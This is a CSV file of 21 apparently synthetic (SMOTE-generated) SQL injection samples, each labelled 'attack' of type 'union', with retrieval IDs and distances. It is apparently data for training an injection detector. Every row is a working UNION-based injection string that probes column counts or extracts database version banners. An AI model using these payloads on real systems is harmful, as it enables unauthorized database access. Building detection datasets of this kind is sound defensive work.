id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000126,0.4244990324652221
SMOTE_000002,attack,union,"1'+  (  select 'pgje' where 4658  =  4658 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000168,1.179127728483011
SMOTE_000003,attack,union,"1' where 7688  =  7688 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,0.42393021011694193
SMOTE_000004,attack,union,"-9240' union all select 6538,6538,6538#",nearest_attack_euclidean,R000234,0.20247411020480952
SMOTE_000005,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000129,0.1052721818311158
SMOTE_000006,attack,union,"-8735'   )    )    union all select 3262,3262,3262--",nearest_attack_euclidean,R000208,0.4506419846173335
SMOTE_000007,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000099,0.33050891317113884
SMOTE_000008,attack,union,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",nearest_attack_euclidean,R000134,0.4473947362143857
SMOTE_000009,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000032,0.36298628095593727
SMOTE_000010,attack,union,"1   )    )    union all select null,null,null--",nearest_attack_euclidean,R000138,0.9300142683726361
SMOTE_000011,attack,union," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000015,0.06552159612518685
SMOTE_000012,attack,union,"1"" where 8672  =  8672 union all select null,null#",nearest_attack_euclidean,R000287,0.18303283043176116
SMOTE_000013,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000175,0.09738736664015253
SMOTE_000014,attack,union,"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",nearest_attack_euclidean,R000089,0.06079147884397928
SMOTE_000015,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000132,0.28849325106662926
SMOTE_000016,attack,union,"1' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000179,0.045934803498402385
SMOTE_000017,attack,union,"-7240'   )    )    union all select 8064,8064,8064#",nearest_attack_euclidean,R000127,0.6883581473566567
SMOTE_000018,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,0.6188078292051558
SMOTE_000019,attack,union,"-4826 union all select 4532,4532,4532,4532,4532--",nearest_attack_euclidean,R000232,0.35291596445585505
SMOTE_000020,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000055,1.0823717081008022
SMOTE_000021,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000028,0.7090983487646358
